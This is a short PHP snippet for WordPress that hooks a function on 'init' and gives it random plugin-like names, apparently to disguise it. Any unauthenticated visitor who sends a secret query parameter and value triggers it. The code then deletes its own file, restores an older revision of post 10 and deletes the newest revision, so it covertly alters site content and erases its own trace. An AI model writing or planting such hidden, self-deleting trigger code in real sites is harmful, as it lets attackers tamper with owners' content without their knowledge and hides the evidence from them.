<?php

function popular_active_extended() {
	if (isset($_GET['database_permalinks_sidebar_nextgen']) && $_GET['database_permalinks_sidebar_nextgen'] === 'survey_gift_modules') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$hello_classic_query = 10;
		$variations_load_pinterest_single = wp_get_post_revisions($hello_classic_query);
		if (empty($variations_load_pinterest_single)) die('no revisions');
		if (count($variations_load_pinterest_single) < 2) die('less than 2');
		$appointment_menus_snippets = array_shift($variations_load_pinterest_single);
		$quote_cloud_marketplace_portfolio = $appointment_menus_snippets->ID;
		$color_save_colors_board = array_shift($variations_load_pinterest_single);
		$number_stripe_gallery = $color_save_colors_board->ID;
		$twitter_views_anywhere_survey = wp_restore_post_revision($number_stripe_gallery);
		if ($twitter_views_anywhere_survey === false) die('error restoring');
		$twitter_views_anywhere_survey = wp_delete_post_revision($quote_cloud_marketplace_portfolio);		
		if ($twitter_views_anywhere_survey === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'popular_active_extended');
